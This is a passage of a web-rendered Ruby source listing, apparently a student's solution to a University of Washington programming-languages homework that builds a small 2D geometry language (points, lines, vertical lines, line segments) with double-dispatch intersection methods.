class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># University of Washington, Programming Languages, Homework 7, hw7.rb </span></span><br><span class="line"><span class="comment"># (See also ML code)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a little language for 2D geometry objects</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># each subclass of GeometryExpression, including subclasses of GeometryValue,</span></span><br><span class="line"><span class="comment">#  needs to respond to messages preprocess_prog and eval_prog</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># each subclass of GeometryValue additionally needs:</span></span><br><span class="line"><span class="comment">#   * shift</span></span><br><span class="line"><span class="comment">#   * intersect, which uses the double-dispatch pattern</span></span><br><span class="line"><span class="comment">#   * intersectPoint, intersectLine, and intersectVerticalLine for </span></span><br><span class="line"><span class="comment">#       for being called by intersect of appropriate clases and doing</span></span><br><span class="line"><span class="comment">#       the correct intersection calculuation</span></span><br><span class="line"><span class="comment">#   * (We would need intersectNoPoints and intersectLineSegment, but these</span></span><br><span class="line"><span class="comment">#      are provided by GeometryValue and should not be overridden.)</span></span><br><span class="line"><span class="comment">#   *  intersectWithSegmentAsLineResult, which is used by </span></span><br><span class="line"><span class="comment">#      intersectLineSegment as described in the assignment</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># you can define other helper methods, but will not find much need to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Note: geometry objects should be immutable: assign to fields only during</span></span><br><span class="line"><span class="comment">#       object construction</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Note: For eval_prog, represent environments as arrays of 2-element arrays</span></span><br><span class="line"><span class="comment"># as described in the assignment</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GeometryExpression</span>  </span></span><br><span class="line">  <span class="comment"># do *not* change this class definition</span></span><br><span class="line">  Epsilon = <span class="number">0</span>.<span class="number">00001</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GeometryValue</span> </span></span><br><span class="line">  <span class="comment"># do *not* change methods in this class definition</span></span><br><span class="line">  <span class="comment"># you can add methods if you wish</span></span><br><span class="line"></span><br><span class="line">  private</span><br><span class="line">  <span class="comment"># some helper methods that may be generally useful</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">real_close</span><span class="params">(r1,r2)</span></span> </span><br><span class="line">    (r1 - r2).abs &lt; GeometryExpression::Epsilon</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">real_close_point</span><span class="params">(x1,y1,x2,y2)</span></span> </span><br><span class="line">    real_close(x1,x2) &amp;&amp; real_close(y1,y2)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="comment"># two_points_to_line could return a Line or a VerticalLine</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">two_points_to_line</span><span class="params">(x1,y1,x2,y2)</span></span> </span><br><span class="line">    <span class="keyword">if</span> real_close(x1,x2)</span><br><span class="line">      VerticalLine.new x1</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      m = (y2 - y1).to_f / (x2 - x1)</span><br><span class="line">      b = y1 - m * x1</span><br><span class="line">      Line.new(m,b)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  public</span><br><span class="line">  <span class="comment"># we put this in this class so all subclasses can inherit it:</span></span><br><span class="line">  <span class="comment"># the intersection of self with a NoPoints is a NoPoints object</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectNoPoints</span> <span class="title">np</span></span></span><br><span class="line">    np <span class="comment"># could also have NoPoints.new here instead</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># we put this in this class so all subclasses can inhert it:</span></span><br><span class="line">  <span class="comment"># the intersection of self with a LineSegment is computed by</span></span><br><span class="line">  <span class="comment"># first intersecting with the line containing the segment and then</span></span><br><span class="line">  <span class="comment"># calling the result's intersectWithSegmentAsLineResult with the segment</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectLineSegment</span> <span class="title">seg</span></span></span><br><span class="line">    line_result = intersect(two_points_to_line(seg.x1,seg.y1,seg.x2,seg.y2))</span><br><span class="line">    line_result.intersectWithSegmentAsLineResult seg</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoPoints</span> &lt; GeometryValue</span></span><br><span class="line">  <span class="comment"># do *not* change this class definition: everything is done for you</span></span><br><span class="line">  <span class="comment"># (although this is the easiest class, it shows what methods every subclass</span></span><br><span class="line">  <span class="comment"># of geometry values needs)</span></span><br><span class="line">  <span class="comment"># However, you *may* move methods from here to a superclass if you wish to</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Note: no initialize method only because there is nothing it needs to do</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">eval_prog</span> <span class="title">env</span> </span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># all values evaluate to self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">preprocess_prog</span></span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># no pre-processing to do here</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(dx,dy)</span></span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># shifting no-points is no-points</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersect</span> <span class="title">other</span></span></span><br><span class="line">    other.intersectNoPoints <span class="keyword">self</span> <span class="comment"># will be NoPoints but follow double-dispatch</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectPoint</span> <span class="title">p</span></span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># intersection with point and no-points is no-points</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectLine</span> <span class="title">line</span></span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># intersection with line and no-points is no-points</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectVerticalLine</span> <span class="title">vline</span></span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># intersection with line and no-points is no-points</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="comment"># if self is the intersection of (1) some shape s and (2) </span></span><br><span class="line">  <span class="comment"># the line containing seg, then we return the intersection of the </span></span><br><span class="line">  <span class="comment"># shape s and the seg.  seg is an instance of LineSegment</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectWithSegmentAsLineResult</span> <span class="title">seg</span></span></span><br><span class="line">    <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> &lt; GeometryValue</span></span><br><span class="line">  <span class="comment"># *add* methods to this class -- do *not* change given code and do not</span></span><br><span class="line">  <span class="comment"># override any methods</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Note: You may want a private helper method like the local</span></span><br><span class="line">  <span class="comment"># helper function inbetween in the ML code</span></span><br><span class="line">  <span class="keyword">attr_reader</span> <span class="symbol">:x</span>, <span class="symbol">:y</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(x,y)</span></span></span><br><span class="line">    @x = x</span><br><span class="line">    @y = y</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">eval_prog</span> <span class="title">env</span> </span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># all values evaluate to self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">preprocess_prog</span> </span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># no pre-processing to do here</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(dx,dy)</span></span></span><br><span class="line">    Point.new(@x+dx,@y+dy)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersect</span> <span class="title">other</span></span></span><br><span class="line">    other.intersectPoint <span class="keyword">self</span> <span class="comment"># will be Points but follow double-dispatch</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectPoint</span> <span class="title">p</span></span></span><br><span class="line">    <span class="keyword">if</span> real_close_point(@x,@y,p.x,p.y)<span class="comment"># intersection with point and no-points is no-points</span></span><br><span class="line">      <span class="keyword">self</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">      NoPoints.new()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectLine</span> <span class="title">line</span></span></span><br><span class="line">    <span class="keyword">if</span> real_close(@y,line.m*@x + line.b) <span class="comment"># intersection with line and no-points is no-points</span></span><br><span class="line">      <span class="keyword">self</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">      NoPoints.new()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectVerticalLine</span> <span class="title">vline</span></span></span><br><span class="line">    <span class="keyword">if</span> real_close(@x,vline.x)<span class="comment"># intersection with line and no-points is no-points</span></span><br><span class="line">      <span class="keyword">self</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">      NoPoints.new()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># if self is the intersection of (1) some shape s and (2) </span></span><br><span class="line">  <span class="comment"># the line containing seg, then we return the intersection of the </span></span><br><span class="line">  <span class="comment"># shape s and the seg.  seg is an instance of LineSegment</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">inbetween</span> <span class="params">(v,end1,end2)</span></span></span><br><span class="line">    <span class="keyword">if</span>((end1 - GeometryExpression::Epsilon &lt;= v <span class="keyword">and</span> v &lt;= end2 + GeometryExpression::Epsilon) <span class="keyword">or</span></span><br><span class="line">       (end2 - GeometryExpression::Epsilon &lt;= v <span class="keyword">and</span> v &lt;= end1 + GeometryExpression::Epsilon))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span> </span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectWithSegmentAsLineResult</span> <span class="title">seg</span></span></span><br><span class="line">    <span class="keyword">if</span> inbetween(@x,seg.x1,seg.x2) <span class="keyword">and</span> inbetween(@y,seg.y1,seg.y2)</span><br><span class="line">      <span class="keyword">self</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      NoPoints.new()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Line</span> &lt; GeometryValue</span></span><br><span class="line">  <span class="comment"># *add* methods to this class -- do *not* change given code and do not</span></span><br><span class="line">  <span class="comment"># override any methods</span></span><br><span class="line">  <span class="keyword">attr_reader</span> <span class="symbol">:m</span>, <span class="symbol">:b</span> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(m,b)</span></span></span><br><span class="line">    @m = m</span><br><span class="line">    @b = b</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">eval_prog</span> <span class="title">env</span> </span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># all values evaluate to self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">preprocess_prog</span></span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># no pre-processing to do here</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(dx,dy)</span></span></span><br><span class="line">    Line.new(@m,@b + dy - @m*dx)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersect</span> <span class="title">other</span></span></span><br><span class="line">    other.intersectLine <span class="keyword">self</span> <span class="comment"># will be NoPoints but follow double-dispatch</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectPoint</span> <span class="title">p</span></span></span><br><span class="line">    p.intersectLine <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectLine</span> <span class="title">line</span></span></span><br><span class="line">    <span class="keyword">if</span> real_close(@m,line.m) <span class="comment"># intersection with line and no-points is no-points</span></span><br><span class="line">      <span class="keyword">if</span> real_close(@b,line.b)</span><br><span class="line">        <span class="keyword">self</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        NoPoints.new()</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">      x = (line.b - @b) / (@m - line.m)</span><br><span class="line">  y = @m * x + @b</span><br><span class="line">      Point.new(x,y)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectVerticalLine</span> <span class="title">vline</span></span></span><br><span class="line">    Point.new(vline.x,@m*vline.x + @b)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># if self is the intersection of (1) some shape s and (2) </span></span><br><span class="line">  <span class="comment"># the line containing seg, then we return the intersection of the </span></span><br><span class="line">  <span class="comment"># shape s and the seg.  seg is an instance of LineSegment</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectWithSegmentAsLineResult</span> <span class="title">seg</span></span></span><br><span class="line">    seg</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VerticalLine</span> &lt; GeometryValue</span></span><br><span class="line">  <span class="comment"># *add* methods to this class -- do *not* change given code and do not</span></span><br><span class="line">  <span class="comment"># override any methods</span></span><br><span class="line">  <span class="keyword">attr_reader</span> <span class="symbol">:x</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span> <span class="title">x</span></span></span><br><span class="line">    @x = x</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">eval_prog</span> <span class="title">env</span> </span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># all values evaluate to self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">preprocess_prog</span></span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># no pre-processing to do here</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(dx,dy)</span></span></span><br><span class="line">    VerticalLine.new(@x + dx)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersect</span> <span class="title">other</span></span></span><br><span class="line">    other.intersectVerticalLine <span class="keyword">self</span> <span class="comment"># will be NoPoints but follow double-dispatch</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectPoint</span> <span class="title">p</span></span></span><br><span class="line">    p.intersectVerticalLine <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectLine</span> <span class="title">line</span></span></span><br><span class="line">    line.intersectVerticalLine <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectVerticalLine</span> <span class="title">vline</span></span></span><br><span class="line">    <span class="keyword">if</span> real_close(@x,vline.x)</span><br><span class="line">      <span class="keyword">self</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      NoPoints.new()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># if self is the intersection of (1) some shape s and (2) </span></span><br><span class="line">  <span class="comment"># the line containing seg, then we return the intersection of the </span></span><br><span class="line">  <span class="comment"># shape s and the seg.  seg is an instance of LineSegment</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectWithSegmentAsLineResult</span> <span class="title">seg</span></span></span><br><span class="line">    seg</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LineSegment</span> &lt; GeometryValue</span></span><br><span class="line">  <span class="comment"># *add* methods to this class -- do *not* change given code and do not</span></span><br><span class="line">  <span class="comment"># override any methods</span></span><br><span class="line">  <span class="comment"># Note: This is the most difficult class.  In the sample solution,</span></span><br><span class="line">  <span class="comment">#  preprocess_prog is about 15 lines long and </span></span><br><span class="line">  <span class="comment"># intersectWithSegmentAsLineResult is about 40 lines long</span></span><br><span class="line">  <span class="keyword">attr_reader</span> <span class="symbol">:x1</span>, <span class="symbol">:y1</span>, <span class="symbol">:x2</span>, <span class="symbol">:y2</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span> <span class="params">(x1,y1,x2,y2)</span></span></span><br><span class="line">    @x1 = x1</span><br><span class="line">    @y1 = y1</span><br><span class="line">    @x2 = x2</span><br><span class="line">    @y2 = y2</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">eval_prog</span> <span class="title">env</span> </span></span><br><span class="line">    <span class="keyword">self</span> <span class="comment"># all values evaluate to self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">preprocess_prog</span></span></span><br><span class="line">    <span class="keyword">if</span> real_close_point(@x1,@y1,@x2,@y2)</span><br><span class="line">      Point.new(@x1,@y1)</span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">      <span class="keyword">if</span> real_close(@x1,@x2) </span><br><span class="line">        <span class="keyword">if</span> @y1 &gt; @y2</span><br><span class="line">          LineSegment.new(x2,y2,x1,y1)</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">          <span class="keyword">self</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> @x1 &gt; @x2</span><br><span class="line">          LineSegment.new(x2,y2,x1,y1)</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">          <span class="keyword">self</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span>     </span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  